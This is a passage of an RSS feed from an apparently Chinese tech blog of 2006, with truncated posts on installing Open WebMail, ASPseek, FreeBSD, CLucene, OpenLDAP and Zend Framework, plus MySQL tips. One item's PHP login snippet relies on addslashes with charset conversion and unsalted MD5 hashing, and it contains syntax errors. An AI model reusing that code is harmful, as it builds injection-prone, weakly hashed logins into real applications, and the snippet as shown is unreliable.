      <description>目前，网上能找到不少WebMail软件，但多为商业软件，动辄支持百万级用户。它们虽然功能很强，但对一般单位来讲，有点儿“大材小用”。那么，能否找到这样一个WebMail：免费的、对中文支持较好、能够让用户既保留原有使用习惯又能通过Web界面收发邮件？ Open WebMail由Perl编写，遵循GPL版权，可运行于多种版本Linux/Unix上，对系统要求低，只需拥有支持CGI的Web Server和Perl 5.005及以上版本即可，无需数据库支持，安装容易，维护方便。作为一个轻量级的Webmail软件，Open WebMail较好地实现了收发邮件的各项功能，完全能满足一般的应用。它对系统要求低，维护方便，非常适合在科研院所、大专院校中使用。笔者所在实验室(运行环境为：邮件服务器 DELL L667r，配置为PⅢ667MHz/128M/15GB，RedHat6.2/Apache 1.3.12/Perl 5.005_03，用户数120人左右)已使用它半年多，运行良好，得到了用户的认可。 下面就以RedHat 6.2为例，介绍一下Open WebMail 的安装方法。我们假设所有软件存放于/tmp目录，所有操作以Root身份进行。 1.准备工作 从网站下载如下软件包： CGI.pm-2.74.tar.gz MIME-Base64-2.12.tar.gz Authen-PAM-0.12.tar.gz ispell-3.1.20.tar.gz hc-30.tar.gz 以CGI.pm为例，安装方法如下： cd /tmp tar -zxvf CGI.pm-2.74.tar.gz cd CGI.pm-2.74 perl Makefile.PL make make install 其它软件包的安装类似。 2.下载openwebmail-X.XX.tgz (其中X.XX为版本号，截至2001年11月的稳定版本为1.51)，做如下操作： cd /home/httpd tar -zxvBpf /tmp/openwebmail- X.XX.tgz mv data/openwebmail html/ rmdir data 3.配置 (1)在/home/httpd/cgi-bin/ openwebmail目录下修改 openwebmail.pl、openwebmail-main.pl、openwebmail-prefs.pl、spellcheck.pl和checkmail.pl，把其中的/usr/local/www/cgi-bin/ openwebmail改为/home/httpd/ cgi-bin/openwebmail 。 (2)修改 auth_unix.pl 把 设为 /etc/shadow 把 设为 none (3)修改 /home/httpd/cgi-bin/ openwebmail/etc/openwebmail.conf，根据机器配置调整mailspooldir、ow_htmldir、ow_cgidir、spellcheck 等参数，并设定 Webmail 的缺省参数，如邮件夹限额、闲置时间、背景、缺省签名档等。 (4)修改/etc/sendmail.cf，在Trusted users中加入Thttpd_user，其中httpd_user根据系统设置来定，如nobody或apache。 4.</description>
    </item>
    
    <item>
      <title>配置aspseek建立强大的企业级搜索引擎</title>
      <link>http://example.org/2006/05/18/e9858de7bdaeaspseeke5bbbae7ab8be5bcbae5a4a7e79a84e4bc81e4b89ae7baa7e6909ce7b4a2e5bc95e6938e/</link>
      <pubDate>Thu, 18 May 2006 11:43:17 +0000</pubDate>
      
      <guid>http://example.org/2006/05/18/e9858de7bdaeaspseeke5bbbae7ab8be5bcbae5a4a7e79a84e4bc81e4b89ae7baa7e6909ce7b4a2e5bc95e6938e/</guid>
      <description>建立搜索引擎 没有全文检索，企业内部的知识管理系统就不能成为成功的系统。构建一个类似 GOOGLE 的全文检索系统的是否要花费巨大呢？看看 Google 的搜索引擎软件目录吧。
我对其中的两个开放源码的搜索引擎进行了测试。htdig 是一个不错的搜索引擎软件，可惜不支持中文的检索；ASPseek 接着走入我的视线，这个软件对中文的支持非常之好，就连CGI的界面、CGI传递参数都和 GOOGLE 非常类似。
ASPseek 由三个部分组成：前端的 cgi 程序 s.cgi 提供查询界面和返回查询结果；后端的守护程序 searchd 接收cgi程序的查询请求，执行数据库查询，返回结果；后台数据库的维护则由程序 index 完成。
相关链接：
Google的搜索引擎软件目录
参见：http://dir.google.com/alpha/Top/ … net/Servers/Search/
另一个搜索引擎软件目录：
Search Tools for Web Sites and Intranets ：http://www.searchtools.com/tools/tools.html
ASPseek 网站
ASPseek.org：http://www.aspseek.org/
ASPseek论坛
关于ASPseek的求助信息，可以访问ASPseek论坛：http://forum.aspseek.org/。
2.1. 安装 ASPSeek ASPseek 安装过程比较简单，需要注意的是 ASPseek 的安装和运行需要先安装和配置 MySQL。下面是一般的安装过程（假设MySQL已经正确的安装在路径 /usr/local/mysql/ 下）：
root&amp;gt;; tar zxvf aspseek-1.2.10.tar.gz root&amp;gt;; cd aspseek-1.2.10 root&amp;gt;; ./configure –with-mysql=/usr/local/mysql –prefix=/usr/local/aspseek root&amp;gt;; make &amp;amp;&amp;amp; make install root&amp;gt;; /usr/local/aspseek/sbin/aspseek-mysql-postinstall root&amp;gt;; cp /usr/local/aspseek/bin/s.</description>
    </item>
    
    <item>
      <title>正则表达式学习笔记</title>
      <link>http://example.org/2006/05/18/e6ada3e58899e8a1a8e8bebee5bc8fe5ada6e4b9a0e7ac94e8aeb0/</link>
      <pubDate>Thu, 18 May 2006 01:51:42 +0000</pubDate>
      
      <guid>http://example.org/2006/05/18/e6ada3e58899e8a1a8e8bebee5bc8fe5ada6e4b9a0e7ac94e8aeb0/</guid>
      <description>正则表达式(regular expression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。 列目录时，　dir .txt或ls .txt中的.txt就不是一个正则表达式,因为这里与正则式的*的含义是不同的。 为便于理解和记忆，先从一些概念入手，所有特殊字符或字符组合有一个总表在后面，最后一些例子供理解相应的概念。 正则表达式
是由普通字符（例如字符 a 到 z）以及特殊字符（称为元字符）组成的文字模式。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。 可以通过在一对分隔符之间放入表达式模式的各种组件来构造一个正则表达式，即/expression/ 普通字符
由所有那些未显式指定为元字符的打印和非打印字符组成。这包括所有的大写和小写字母字符，所有数字，所有标点符号以及一些符号。 非打印字符
字符 含义 \cx 匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 &#39;c&#39; 字符。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 特殊字符 所谓特殊字符，就是一些有特殊含义的字符，如上面说的&amp;quot;*.txt&amp;quot;中的*，简单的说就是表示任何字符串的意思。如果要查找文件名中有＊的文件，则需要对＊进行转义，即在其前加一个\。ls \*.txt。正则表达式有以下特殊字符。 特别字符 说明 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 &#39;\n&#39; 或 &#39;\r&#39;。要匹配 $ 字符本身，请使用 \$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。 .</description>
    </item>
    
    <item>
      <title>阿新FreeBSD服务器安装流程</title>
      <link>http://example.org/2006/05/16/e998bfe696b0freebsde69c8de58aa1e599a8e5ae89e8a385e6b581e7a88b/</link>
      <pubDate>Tue, 16 May 2006 12:42:38 +0000</pubDate>
      
      <guid>http://example.org/2006/05/16/e998bfe696b0freebsde69c8de58aa1e599a8e5ae89e8a385e6b581e7a88b/</guid>
      <description>如果简单安装一个web服务器 FreeBSD 安装是非常傻瓜和友好的
1，安装系统 我的分区 120G为例 256M / 2048M swap (1G内存) 10240M /var 4096M /usr 1024M /home 1025M /tmp 剩下的 /pub 实验证明 这种分区目前美掉过数据 选择MINI安装，FreeBSD安装可能是所有系统中最快的，大概 4-5分钟 2，系通更新 cvsup down回来最新的源代码 cd /usr/src make buildworld 修改内核 make buildkernel KERNCONF=NEWKERNEL make installkernel KERNCONF=NEWKERNEL make installworld mergemaster -cv 输入 i 安装新的 reboot 正常启动 系统更新ok 这是个漫长的过程，这段时间我一般都在CS 3，安装应用程序 cvsup down回最新的ports库 1,perl cd /usr/ports/lang/perl5.8 make install clean 2,apache cd /usr/ports/lang/apache13-modssl make APACHE_HARD_SERVER_LIMIT=1024 install clean APACHE_HARD_SERVER_LIMIT=1024 apache最大连接数 3,mysql cd /usr/ports/databases/mysql40-server make WITH_CHARSET=gbk WITH_XCHARSET=all WITH_OPENSSL=yes WITH_PROC_SCOPE_PTH=yes BUILD_OPTIMIZED=yes install clean 进站了 在火车上再写 继续 4.</description>
    </item>
    
    <item>
      <title>又出现Incorrect key file for table:</title>
      <link>http://example.org/2006/05/15/e58f88e587bae78eb0incorrect-key-file-for-table/</link>
      <pubDate>Mon, 15 May 2006 06:54:13 +0000</pubDate>
      
      <guid>http://example.org/2006/05/15/e58f88e587bae78eb0incorrect-key-file-for-table/</guid>
      <description>真不知道MYSQL最近怎么了,老是出错
解决方法还是修复一下
REPAIR TABLE xxx</description>
    </item>
    
    <item>
      <title>CLUCENE-0.9.10 索引与优化过程</title>
      <link>http://example.org/2006/05/14/clucene-0910-e7b4a2e5bc95e4b88ee4bc98e58c96e8bf87e7a88b/</link>
      <pubDate>Sun, 14 May 2006 02:34:27 +0000</pubDate>
      
      <guid>http://example.org/2006/05/14/clucene-0910-e7b4a2e5bc95e4b88ee4bc98e58c96e8bf87e7a88b/</guid>
      <description>一.文件索引过程 主要流程描述
IndexWriter writer(&amp;quot;ndx&amp;quot;, &amp;amp;an;, true); writer.setMergeFactor(10); writer.setMinMergeDocs(10); Document *lpDoc = new Document; lpDoc-&amp;gt;add(*new Field(&amp;quot;content&amp;quot;, &amp;quot;This is demo content.&amp;quot;, true, true, true) ); writer.addDocument(lpDoc); delete lpDoc; writer.close(); 下面描述该流程
1.IndexWriter writer(&amp;quot;ndx&amp;quot;, &amp;amp;an;, true); directory = FSDirectory::getDirectory(&amp;quot;ndx&amp;quot;, true); 从一个全局的列表中取得一个对象 如果对象不存在，则新建一个并加入到列表中 主要目的是为了使用同一个目录只使用同一个FSDirectory对象 新建目录时删除该目录下所有文件级子目录 analyzer = an; 该对象由对象外部创建 segmentInfos = _CLNEW SegmentInfos; 建立一个SegmentInfos对象，该对象包含一个SegmentInfo对象的列表 建立时指定了SegmentInfo对象的列表并不在移除指针时删除SegmentInfo对象 一个SegmentInfo对象包括其名称(用于文件名前缀)和文档数 closeDir = true; 指定是否在索引对象关闭close时，是否同时调用目录的close函数 缺省为关闭目录对象 similarity = CL_NS(search)::Similarity::getDefault(); 取得缺省的文档分值score计算对象，如果不存在则建立 可以自己实现一个Similarity的继承类，然后用Similarity::setDefault方法设置成缺省的 变量Similarity* _defaultImpl用于保存缺省对象 ramDirectory = _CLNEW TransactionalRAMDirectory; 建立一个TransactionalRAMDirectory对象，该对象包含一个事务取消时的删除文件列表及恢复文件列表 同时还包含一个当前文件列表 恢复文件列表自动删除key和value，删除文件列表和当前文件列表则不自动删除 LuceneLock* newLock = directory-&amp;gt;makeLock(&amp;quot;write.</description>
    </item>
    
    <item>
      <title>一个简单的中文分词 CLucene</title>
      <link>http://example.org/2006/05/13/e4b880e4b8aae7ae80e58d95e79a84e4b8ade69687e58886e8af8d-clucene/</link>
      <pubDate>Sat, 13 May 2006 18:52:10 +0000</pubDate>
      
      <guid>http://example.org/2006/05/13/e4b880e4b8aae7ae80e58d95e79a84e4b8ade69687e58886e8af8d-clucene/</guid>
      <description>CLucene - a C++ search engine http://sourceforge.net/projects/clucene/ 传统的全文检索都是基于数据库的，Sql Server Oracle mysql 都提供全文检索，但这些比较大，不适合单机或小应用程序(Mysql4.0以上可以作为整合开发)，Mysql也不支持中文。 后来得知Apache有一个开源的全文检索引擎，而且应用比较广，Lucene是Apache旗下的JAVA版的全文检索引擎,性能相当出色，可惜是java版的，我一直在想有没有C或C++版的，终于有一天在http://sourceforge.net 淘到一个好东东，Clucene！CLucene是C++版的全文检索引擎,完全移植于Lucene，不过对中文支持不好，而且有很多的内存泄露，:P Cluene不支持中文的分词，我就写了一个简单的中文分词，大概思路就是传统的二分词法，因为中文的分词不像英文这类的语言，一遇到空格或标点就认为是一个词的结束，所以就采用二分词法，二分词法就是例如:北京市，就切成 北京 ， 京市。这样一来词库就会很大，不过是一种简单的分词方法(过段时间我再介绍我对中文分词的一些思路) ，当然了，在检索时就不能输入“北京市”了，这样就检索不到，只要输入：“+北京 +京市”,就可以检索到北京市了，虽然精度不是很高，但适合简单的分词，而且不怕会漏掉某些单词。 我照着Clucene的分词模块，做了一个ChineseTokenizer，这个模块就负责分词工作了，我把主要的函数写出来
ChineseTokenizer.cpp: Token* ChineseTokenizer::next() { while(!rd.Eos()) { char_t ch = rd.GetNext(); if( isSpace((char_t)ch)!=0 ) { continue; } // Read for Alpha-Nums and Chinese if( isAlNum((char_t)ch)!=0 ) { start = rd.Column(); return ReadChinese(ch); } } return NULL; } Token* ChineseTokenizer::ReadChinese(const char_t prev) { bool isChinese = false; StringBuffer str; str.append(prev); char_t ch = prev; if(((char_t)ch&amp;gt;&amp;gt;8)&amp;amp;&amp;amp;(char_t)ch&amp;gt;=0xa0) isChinese = true; while(!</description>
    </item>
    
    <item>
      <title>PECL中的clucene库</title>
      <link>http://example.org/2006/05/13/pecle4b8ade79a84clucenee5ba93/</link>
      <pubDate>Sat, 13 May 2006 18:27:31 +0000</pubDate>
      
      <guid>http://example.org/2006/05/13/pecle4b8ade79a84clucenee5ba93/</guid>
      <description>getMessage() . ‘, ‘; echo ‘File: ‘ . $e-&amp;gt;getFile() . ‘, ‘; echo ‘Line: ‘ . $e-&amp;gt;getLine(); exit(); } $query = ”; if (isset($_SERVER[&#39;argv&#39;][1])) { $query = $_SERVER[&#39;argv&#39;][1]; } else { $query = “time”; /* Should return 3 results */ } echo “Search results for: ‘$query’\n”; $hits = $searcher-&amp;gt;search($query); $length = $hits-&amp;gt;length(); echo “Number of results: $length\n”; for ($i = 0; $i &amp;lt; $length; $i++) { echo &#39;path: &#39; . $hits-&amp;gt;get($i, ‘path’) .</description>
    </item>
    
    <item>
      <title>php &#43; clucene extension的安装</title>
      <link>http://example.org/2006/05/13/php-clucene-extensione79a84e5ae89e8a385/</link>
      <pubDate>Sat, 13 May 2006 18:21:41 +0000</pubDate>
      
      <guid>http://example.org/2006/05/13/php-clucene-extensione79a84e5ae89e8a385/</guid>
      <description>CLucene是SF上面的一个对Lucene(一个用Java写的全文检索引擎工具包)的移植,做为Lucene的C++的重新实现，以带来更快的检索速度,但是一直还不stable.这里仅仅是尝试php+clucene扩展的安装,具体应用先不管.
安装环境: Freebsd 6.0 + apache 2.2 + php 5.1.2
apache+php的安装就不说了,网上一抓一大把,注意clucene扩展必须在php5以上才能安装.
首先安装clucene 1.下载clucene 直奔它的首页–clucene.sourceforge.net,下载clucene 0.9.10 2.编译clucene
tar xzvf clucene-0.9.10.tar.gz cd clucene-0.9.10 ./autogen.sh ./configure make 这样clucene就安装好了,为了让其它程序可以调用clucene,这里把编译好的lib放到系统lib目录下 cp src/.libs/libclucene.* /usr/local/lib cp src/CLucene.h /usr/local/include/ cp -r src/CLucene /usr/local/include/ 安装clucene php extension 1.下载clucene php extension 在pecl.php.net有下载,拖回来就是 http://pecl.php.net/package/clucene 2.编译clucene php extension tar xzvf clucene-0.0.9.tgz cd clucene-0.0.9 cp -r /usr/local/include/Clucene include/ #编译时要把clucene的include文件弄一份 cp -r /usr/local/include/Clucene.h include/ phpize ./configure make 编译完成,这里会生成一个clucene.so,我们把它放在php的extension目录下(没有就建一个),然后修改php.ini
加入 extension=clucene.so
重启apache之后看phpinfo
php+clucene
至此安装就算完成了,demo嘛在examples目录下有一个,命令行调用方式(根据已有的index检索): php clucene.</description>
    </item>
    
    <item>
      <title>mysql表无法打开</title>
      <link>http://example.org/2006/05/13/mysqle8a1a8e697a0e6b395e68993e5bc80/</link>
      <pubDate>Sat, 13 May 2006 13:26:17 +0000</pubDate>
      
      <guid>http://example.org/2006/05/13/mysqle8a1a8e697a0e6b395e68993e5bc80/</guid>
      <description>出现#1016 - Can&amp;rsquo;t open file: &amp;lsquo;xxx.MYI&amp;rsquo; (errno: 145)
不知怎么造成的，可能是垃圾太多了吧，优化一下就可以解决问题的
REPAIR TABLE xxx就可以了</description>
    </item>
    
    <item>
      <title>Zend Framework 手册中文版</title>
      <link>http://example.org/2006/05/12/zend-framework-e6898be5868ce4b8ade69687e78988/</link>
      <pubDate>Fri, 12 May 2006 14:29:54 +0000</pubDate>
      
      <guid>http://example.org/2006/05/12/zend-framework-e6898be5868ce4b8ade69687e78988/</guid>
      <description>相信Zend Framework对于很多人都有借鉴意义（即使你不支持MVC），我打算花点业余时间把Zend Framework的手册翻译过来。应该对新手，老手都有点用 翻译的路线是按我自己的的兴趣来安排的呵呵，ZF提供的那些类库，不一定会全部一一说明，因为我觉得大家可能都有自己的类库，不一定要用ZF的。主要还是看看它的框架。 目前打算在这个版块和我的Blog上同步更新，等全部完成后，打包成chm文档提供下载。 如果谁有兴趣参与，非常欢迎，请与我联系 msn &amp;amp; email：haohappy at msn.com (at-&amp;gt;@) 第一章. Zend 目录 1.1. 简介 1.2. Zend::loadFile() 1.3. Zend::loadClass() 1.4. Zend::loadInterface() 1.5. Zend::isReadable() 1.6. Zend::dump() 1.7. Zend::register() 1.8. Zend::registry() 1.1.简介 Zend类是Zend Framework的基类，之所以有这个类是为了使Zend Framework遵循DRY原则（Don’t Repeat Yourself）。这个类只包含静态方法，这些类方法具有Zend Framework中的很多组件都需要的功能。 1.2. Zend::loadFile() Zend::loadFile()用来包含PHP文件。它其实是将PHP的include()函数封装而成的一个静态方法。当包含文件失败时，会抛出异常(Zend_Exception，见后面–Haohappy注)。
loadFile($filename, $dirs=null, $once=false) 参数： 文件，目录(路径)，是否只包含一次 $filename参数指定需要加载的文件，注意$filename不需要指定任何路径，只需要文件名即可。ZF会对文件作安全性检查。$filename只能由字母，数字，连接符-,下划线_及英文句号.组成(半角)。$dir则不限，可以使用中文等。 $dirs参数用来指定文件所在目录，如果为空，则程序将会到系统的include_path下寻找文件是否存在（include_path可在php.ini中设置–Haohappy注） $once参数为布尔类型，只能是true或false，两者区别就和include()和include_once()的区别一样。 1.3. Zend::loadClass() Zend::loadClass()用来加载一个PHP类文件，这个文件的文件名必须和文件中的类同名。loadClass()会检查文件中的类是否存在。如果文件中的类不存在，那么就会抛出一个Zend_Exception异常。 (例：TestClass.php中有个类TestClass，使用Zend::loadClass(“TestClass”)就可加载这个类，这种作法类似于Java– Haohappy注) loadClass($class, $dirs) 参数： 类，目录 如果没有指定$dirs参数，而文件名中存在下划线，那么loadClass()会自动把下划线当成目录分隔符，去相应的目录中去查找文件。 例如：loadClass(“Zend_Example_Class”) 没指定$dirs参数 ，则 loadClass()会自动到Zend/Example/目录下去查找Class.php文件 1.4. Zend::loadInterface() Zend::loadInterface()和Zend::loadClass()的用法是一样的，区别在于loadInterface()是用来加载接口。Zend::loadClass() 不能用来加载接口，因为PHP函数class_exists()不能检查Interface是否存在（PHP 5.0.2之前版本），所以需要用Zend::loadInterface()来代替。 loadInterface($interface, $dirs) 同样，如果你没有指定目录，但是文件中含有下划线_，Zend::loadInterface()也会自动到相应目录去寻找文件，这和Zend::loadClass()是一样的。 1.</description>
    </item>
    
    <item>
      <title>于Lucene/XML的站内全文检索解决方案</title>
      <link>http://example.org/2006/05/12/e4ba8elucenexmle79a84e7ab99e58685e585a8e69687e6a380e7b4a2e8a7a3e586b3e696b9e6a188/</link>
      <pubDate>Fri, 12 May 2006 13:04:36 +0000</pubDate>
      
      <guid>http://example.org/2006/05/12/e4ba8elucenexmle79a84e7ab99e58685e585a8e69687e6a380e7b4a2e8a7a3e586b3e696b9e6a188/</guid>
      <description>关键词：Lucene xml xslt web site search engine 内容摘要： 为Lucene做一个通用XML接口一直是我最大的心愿：更方便的在WEB应用中嵌入全文检索功能
提供了XML的数据输入接口：适合将原有基于各种数据库的数据源导入到全文索引中，保证了数据源的平台无关性； 通过了基于XML的搜索结果输出：方便了通过XSLT进行前台的结果显示；
MySQL \ / JSP Oracle - DB - ==&amp;gt; XML ==&amp;gt; (Lucene Index) ==&amp;gt; XML - ASP MSSQL / - PHP MS Word / \ / XHTML PDF / =XSLT=&amp;gt; - TEXT \ XML \_________WebLucene__________/ 使用过程如下： 将数据用脚本导出成XML格式； 将XML数据源导入LUCENE索引； 从WEB界面得到XML结果输出，并通过XSLT生成HTML页面 站内全文检索的必要性
虽然大型搜索引擎的功能已经越来越强大了，很多站点都使用了Google的站内检索site:domain.com代替了自己的站内数据库“全文”检索。但依靠GOOGLE这样的大型搜索引擎做站内检索会有以下弊端：
数量有限：搜索引擎并不会深度遍历一个网站，而将网站所有的内容都索引进去，比如Google就喜欢静态网页，而且是最新更新的，而不喜欢带?的动态网页，Google甚至会定期将缺少入口的网站内容逐渐抛弃； 更新慢：搜索引擎针对站点的更新频率也是有一定周期的，很多内容需要一定时间后才能进入GOOGLE的索引：目前Google Dance的周期是21天左右； 内容不精确：搜索引擎需要通过页面内容提取技术将导航条，页头页尾等内容过滤掉，反而不如直接从后台数据库提取数据来得直接，这种摘要和排重机制是很难实现的； 无法控制输出：也许有更多的输出需求，按时间排序，按价格，按点击量，按类目过滤等 系统的搭建
下载： http://sourceforge.net/projects/weblucene/
XML数据源的导入：
只要数据源可以导出成3层的XML结构，就都可以用IndexRunner这个命令行工具导入：
比如从数据库导出：news_dump.xml 标题 作者 内容 2003-06-29 My Title chedong abc 2003-06-30 &amp;hellip; IndexRunner -i news_dump.</description>
    </item>
    
    <item>
      <title>Lucene 全文检索实践</title>
      <link>http://example.org/2006/05/12/lucene-e585a8e69687e6a380e7b4a2e5ae9ee8b7b5/</link>
      <pubDate>Fri, 12 May 2006 12:22:24 +0000</pubDate>
      
      <guid>http://example.org/2006/05/12/lucene-e585a8e69687e6a380e7b4a2e5ae9ee8b7b5/</guid>
      <description></description>
    </item>
    
    <item>
      <title>在应用中加入全文检索功能</title>
      <link>http://example.org/2006/05/12/e59ca8e5ba94e794a8e4b8ade58aa0e585a5e585a8e69687e6a380e7b4a2e58a9fe883bd/</link>
      <pubDate>Fri, 12 May 2006 12:16:09 +0000</pubDate>
      
      <guid>http://example.org/2006/05/12/e59ca8e5ba94e794a8e4b8ade58aa0e585a5e585a8e69687e6a380e7b4a2e58a9fe883bd/</guid>
      <description></description>
    </item>
    
    <item>
      <title>用mysql的replace函数替换字符串</title>
      <link>http://example.org/2006/05/04/e794a8mysqle79a84replacee587bde695b0e69bbfe68da2e5ad97e7aca6e4b8b2/</link>
      <pubDate>Thu, 04 May 2006 22:45:17 +0000</pubDate>
      
      <guid>http://example.org/2006/05/04/e794a8mysqle79a84replacee587bde695b0e69bbfe68da2e5ad97e7aca6e4b8b2/</guid>
      <description>用mysql的replace函数替换字符串
比如你要将 表 tb1里面的 f1字段的abc替换为def
UPDATE tb1 SET f1=REPLACE(f1, &amp;lsquo;abc&amp;rsquo;, &amp;lsquo;def&amp;rsquo;);</description>
    </item>
    
    <item>
      <title>web.xml配置详细说明</title>
      <link>http://example.org/2006/04/30/webxmle9858de7bdaee8afa6e7bb86e8afb4e6988e/</link>
      <pubDate>Sun, 30 Apr 2006 13:49:39 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/webxmle9858de7bdaee8afa6e7bb86e8afb4e6988e/</guid>
      <description>1 定义头和根元素
部署描述符文件就像所有XML文件一样，必须以一个XML头开始。这个头声明可以使用的XML版本并给出文件的字符编码。
DOCYTPE声明必须立即出现在此头之后。这个声明告诉服务器适用的servlet规范的版本（如2.2或2.3）并指定管理此文件其余部分内容的语法的DTD(Document Type Definition，文档类型定义)。
所有部署描述符文件的顶层（根）元素为web-app。请注意，XML元素不像HTML，他们是大小写敏感的。因此，web-App和WEB-APP都是不合法的，web-app必须用小写。
2 部署描述符文件内的元素次序
XML 元素不仅是大小写敏感的，而且它们还对出现在其他元素中的次序敏感。例如，XML头必须是文件中的第一项，DOCTYPE声明必须是第二项，而web- app元素必须是第三项。在web-app元素内，元素的次序也很重要。服务器不一定强制要求这种次序，但它们允许（实际上有些服务器就是这样做的）完全拒绝执行含有次序不正确的元素的Web应用。这表示使用非标准元素次序的web.xml文件是不可移植的。
下面的列表给出了所有可直接出现在web-app元素内的合法元素所必需的次序。例如，此列表说明servlet元素必须出现在所有servlet-mapping元素之前。请注意，所有这些元素都是可选的。因此，可以省略掉某一元素，但不能把它放于不正确的位置。
l icon icon元素指出IDE和GUI工具用来表示Web应用的一个和两个图像文件的位置。
l display-name display-name元素提供GUI工具可能会用来标记这个特定的Web应用的一个名称。
l description description元素给出与此有关的说明性文本。
l context-param context-param元素声明应用范围内的初始化参数。
l filter 过滤器元素将一个名字与一个实现javax.servlet.Filter接口的类相关联。
l filter-mapping 一旦命名了一个过滤器，就要利用filter-mapping元素把它与一个或多个servlet或JSP页面相关联。
l listener servlet API的版本2.3增加了对事件监听程序的支持，事件监听程序在建立、修改和删除会话或servlet环境时得到通知。Listener元素指出事件监听程序类。
l servlet 在向servlet或JSP页面制定初始化参数或定制URL时，必须首先命名servlet或JSP页面。Servlet元素就是用来完成此项任务的。
l servlet-mapping 服务器一般为servlet提供一个缺省的URL：http://host/webAppPrefix/servlet/ServletName。但是，常常会更改这个URL，以便servlet可以访问初始化参数或更容易地处理相对URL。在更改缺省URL时，使用servlet-mapping元素。
l session-config 如果某个会话在一定时间内未被访问，服务器可以抛弃它以节省内存。可通过使用HttpSession的setMaxInactiveInterval方法明确设置单个会话对象的超时值，或者可利用session-config元素制定缺省超时值。
l mime-mapping 如果Web应用具有想到特殊的文件，希望能保证给他们分配特定的MIME类型，则mime-mapping元素提供这种保证。
l welcom-file-list welcome-file-list元素指示服务器在收到引用一个目录名而不是文件名的URL时，使用哪个文件。
l error-page error-page元素使得在返回特定HTTP状态代码时，或者特定类型的异常被抛出时，能够制定将要显示的页面。
l taglib taglib元素对标记库描述符文件（Tag Libraryu Descriptor file）指定别名。此功能使你能够更改TLD文件的位置，而不用编辑使用这些文件的JSP页面。
l resource-env-ref resource-env-ref元素声明与资源相关的一个管理对象。
l resource-ref resource-ref元素声明一个资源工厂使用的外部资源。
l security-constraint security-constraint元素制定应该保护的URL。它与login-config元素联合使用
l login-config 用login-config元素来指定服务器应该怎样给试图访问受保护页面的用户授权。它与sercurity-constraint元素联合使用。</description>
    </item>
    
    <item>
      <title>OpenLDAP学习笔记</title>
      <link>http://example.org/2006/04/30/openldape5ada6e4b9a0e7ac94e8aeb0/</link>
      <pubDate>Sun, 30 Apr 2006 11:06:06 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/openldape5ada6e4b9a0e7ac94e8aeb0/</guid>
      <description>Copyright ? 2004，2005， 本文遵从GNU 的自由文档许可证(Free Document License)的条款，欢迎转载、修改、散布。
发布时间:2004年04月07日
最近更新:2005年08月08日
Abstract
LDAP(轻量级目录服务访问协议，Lightweight Directory Access Protocol)基于X.500标准，支持TCP/IP，使用简单方便。现在越来越多的网络应用系统都支持LDAP。OpenLDAP是LDAP的一种开源实现，本笔记基于OpenLDAP2.1.29。 Table of Contents
目录服务简介 1.1. X.500和LDAP 1.2. LDAP产品 OpenLDAP安装笔记 2.1. 源码安装 2.2. 数据录入 2.2.1. 手动录入方法 2.2.2. 文件方式 2.2.3. 脚本方式 2.3. 常用命令介绍 2.4. 启用sasl验证 2.5. 配置服务器复制 管理工具 3.1. phpldapadmin 3.2. gq 3.3. CPU 3.4. JXplore HowTo 4.1. 禁止整个服务器的匿名访问 Chapter 1. 目录服务简介 Table of Contents 1.1. X.500和LDAP 1.2. LDAP产品 目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它成树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。目录服务是由目录数据库和一套访问协议组成的系统。类似以下的信息适合储存在目录中：
企业员工和企业客户之类人员信息；
公用证书和安全密钥；
邮件地址、网址、IP等电脑信息；
电脑配置信息。
&amp;hellip;
1.1. X.500和LDAP 现在国际上的目录服务标准有两个，一个是较早的X.500标准，一个是较新的LDAP标准。</description>
    </item>
    
    <item>
      <title>数据库编码为gb2312,重新改写了wap程序编码为utf-8</title>
      <link>http://example.org/2006/04/30/e695b0e68daee5ba93e7bc96e7a081e4b8bagb2312e9878de696b0e694b9e58699e4ba86wape7a88be5ba8fe7bc96e7a081e4b8bautf-8/</link>
      <pubDate>Sun, 30 Apr 2006 10:44:48 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/e695b0e68daee5ba93e7bc96e7a081e4b8bagb2312e9878de696b0e694b9e58699e4ba86wape7a88be5ba8fe7bc96e7a081e4b8bautf-8/</guid>
      <description>$user = iconv(&amp;quot;utf-8&amp;quot;, &amp;quot;gb2312&amp;quot;,addslashes(urldecode($_POST[&#39;username&#39;]))); $pass = md5(urldecode($_POST[&#39;password&#39;])); $SQL = &amp;quot;SELECT `password` FROM &amp;quot; . USER_TABLE . &amp;quot; WHERE `username` = &#39;$user&#39;&amp;quot;; $Result = $DB -&amp;gt; query($SQL); $Row = $DB -&amp;gt; queryArray($Result); if($Row[&#39;password&#39;] == $pass){ session_register(name&#39;); $_SESSION[name&#39;] = iconv(&amp;quot;gb2312&amp;quot;, &amp;quot;utf-8&amp;quot;,$user); } </description>
    </item>
    
    <item>
      <title>使用PHP连接LDAP服务器</title>
      <link>http://example.org/2006/04/30/e4bdbfe794a8phpe8bf9ee68ea5ldape69c8de58aa1e599a8/</link>
      <pubDate>Sun, 30 Apr 2006 10:40:13 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/e4bdbfe794a8phpe8bf9ee68ea5ldape69c8de58aa1e599a8/</guid>
